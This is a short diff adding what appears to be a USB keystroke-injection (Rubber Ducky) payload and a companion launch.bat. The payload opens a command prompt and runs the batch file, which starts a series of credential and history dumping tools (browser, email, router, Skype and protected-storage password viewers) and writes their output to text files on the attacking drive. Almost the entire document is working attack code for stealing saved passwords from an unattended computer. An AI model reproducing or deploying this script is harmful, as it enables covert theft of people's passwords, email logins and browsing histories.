@@ -1,0 +1,31 @@
+ENCODE: 
+
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+DELAY 100
+STRING d:\launch.bat
+ENTER
+
+Launch.bat file:
+
+start D:\WebBrowserPassView.exe /stext D:\WebBrowserPassView.txt
+start D:\SkypeLogView.exe /stext D:\SkypeLogView.txt
+start D:\RouterPassView.exe /stext D:\RouterPassView.txt
+start D:\pspv.exe /stext D:\pspv.txt
+start D:\PasswordFox.exe /stext D:\PasswordFox.txt
+start D:\OperaPassView.exe /stext D:\OperaPassView.txt
+start D:\mspass.exe /stext D:\mspass.txt
+start D:\mailpv.exe /stext D:\mailpv.txt
+start D:\iepv.exe /stext D:\iepv.txt
+start D:\ChromePass.exe /stext D:\ChromePass.txt
+start D:\ChromeHistoryView.exe /stext D:\ChromeHistoryView.txt
+start D:\BulletsPassView.exe /stext D:\BulletsPassView.txt
+start D:\BrowsingHistoryView.exe /stext D:\BrowsingHistoryView.txt
+
+
+exit
